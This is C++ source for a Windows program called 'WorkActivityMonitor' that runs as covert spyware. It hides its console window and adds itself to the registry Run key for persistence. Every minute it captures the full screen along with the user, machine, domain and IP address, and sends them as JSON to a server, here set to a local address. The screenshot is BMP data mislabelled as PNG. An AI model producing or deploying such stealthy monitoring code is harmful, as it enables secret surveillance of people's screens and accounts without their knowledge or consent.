#include <iostream>
#include <string>
#include <chrono>
#include <thread>
#include <winsock2.h>
#include <windows.h>
#include <lmcons.h>
#include <sstream>
#include <vector>
#include <filesystem>

#pragma comment(lib, "ws2_32.lib")

const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string getExecutablePath() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return std::string(path);
}

std::string getExecutableDir() {
    std::string execPath = getExecutablePath();
    return std::filesystem::path(execPath).parent_path().string();
}

void addToStartup(const std::string& appName, const std::string& appPath) {
    HKEY hKey;
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER,
                               "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                               0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        RegSetValueEx(hKey, appName.c_str(), 0, REG_SZ,
                      reinterpret_cast<const BYTE*>(appPath.c_str()),
                      appPath.size() + 1);
        RegCloseKey(hKey);
    }
}

std::string base64Encode(const char* data, size_t length) {
    std::string encoded;
    int val = 0, valb = -6;
    for (size_t i = 0; i < length; ++i) {
        val = (val << 8) + (unsigned char)data[i];
        valb += 8;
        while (valb >= 0) {
            encoded.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) encoded.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (encoded.size() % 4) encoded.push_back('=');
    return encoded;
}

std::string captureScreenToBase64() {
    // Параметры для захвата экрана
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    // Создаем устройства
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hbmScreen);

    // Копируем экран в bitmap
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    // Создаем массив для хранения данных BMP
    BITMAP bmpScreen;
    GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);

    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmpScreen.bmWidth;
    bi.biHeight = bmpScreen.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = bmpScreen.bmWidth * 4 * bmpScreen.bmHeight;

    // Заголовок файла BMP
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = bmfHeader.bfOffBits + bi.biSizeImage;
    bmfHeader.bfType = 0x4D42; // BM

    std::vector<char> bmpData(bmfHeader.bfSize);
    memcpy(bmpData.data(), &bmfHeader, sizeof(BITMAPFILEHEADER));
    memcpy(bmpData.data() + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));

    // Копируем данные
    GetDIBits(hdcScreen, hbmScreen, 0, (UINT)bmpScreen.bmHeight, bmpData.data() + bmfHeader.bfOffBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    // Преобразование в Base64
    std::string base64Screenshot = base64Encode(bmpData.data(), bmpData.size());

    // Очистка
    DeleteObject(hbmScreen);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return "data:image/png;base64," + base64Screenshot;
}

std::string getMachineName() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    if (GetComputerNameA(computerName, &size)) {
        return computerName;
    }
    return "Unknown";
}

std::string getUserName() {
    char username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    if (GetUserNameA(username, &size)) {
        return username;
    }
    return "Unknown";
}

std::string getDomainName() {
    char domainName[DNLEN + 1];
    DWORD size = DNLEN + 1;
    if (GetComputerNameExA(ComputerNameDnsDomain, domainName, &size)) {
        return domainName;
    }
    return "Unknown";
}

std::string getIPAddress() {
    WSADATA wsData;
    WSAStartup(MAKEWORD(2, 2), &wsData);
    char hostName[256];
    if (gethostname(hostName, sizeof(hostName)) == SOCKET_ERROR) {
        return "Unknown";
    }
    struct hostent* host = gethostbyname(hostName);
    if (host == nullptr) {
        return "Unknown";
    }
    struct in_addr* addr = (struct in_addr*)host->h_addr_list[0];
    std::string ipAddress = inet_ntoa(*addr);
    WSACleanup();
    return ipAddress;
}

void sendDataToServer(const std::string& jsonData) {
    const char* serverIp = "127.0.0.1";
    const int serverPort = 8000;

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort);
    serverAddr.sin_addr.s_addr = inet_addr(serverIp);

    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connection to server failed. Error code: " << WSAGetLastError() << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return;
    }

    // Формируем HTTP-запрос
    std::ostringstream httpRequest;
    httpRequest << "POST / HTTP/1.1\r\n"
                << "Host: " << serverIp << "\r\n"
                << "Content-Type: application/json\r\n"
                << "Content-Length: " << jsonData.size() << "\r\n"
                << "Connection: close\r\n\r\n"
                << jsonData;

    std::string request = httpRequest.str();
    int bytesSent = send(clientSocket, request.c_str(), request.size(), 0);
    if (bytesSent == SOCKET_ERROR) {
        std::cerr << "Failed to send data. Error code: " << WSAGetLastError() << std::endl;
    } else {
        std::cout << "Data sent to server:\n" << jsonData << std::endl;
    }

    closesocket(clientSocket);
    WSACleanup();
}

int main() {
    while (true) {
        // Скрываем окно консоли
        HWND hWnd = GetConsoleWindow();
        ShowWindow(hWnd, SW_HIDE);

        // Добавление в автозагрузку
        std::string appName = "WorkActivityMonitor";
        std::string appPath = getExecutablePath();
        addToStartup(appName, appPath);

        auto now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
        std::string lastActiveTime = ctime(&now);
        lastActiveTime.pop_back();

        std::string machineName = getMachineName();
        std::string userName = getUserName();
        std::string domainName = getDomainName();
        std::string ipAddress = getIPAddress();
        std::string screenshotData = captureScreenToBase64();

        std::ostringstream jsonData;
        jsonData << "{"
                 << "\"Domain\": \"" << domainName << "\", "
                 << "\"Machine Name\": \"" << machineName << "\", "
                 << "\"IP Address\": \"" << ipAddress << "\", "
                 << "\"User\": \"" << userName << "\", "
                 << "\"Last Active\": \"" << lastActiveTime << "\", "
                 << "\"Screenshot\": \"" << screenshotData << "\""
                 << "}";


        sendDataToServer(jsonData.str());

        // Отправка данных каждую минуту
        std::this_thread::sleep_for(std::chrono::minutes(1));
    }
    return 0;
}
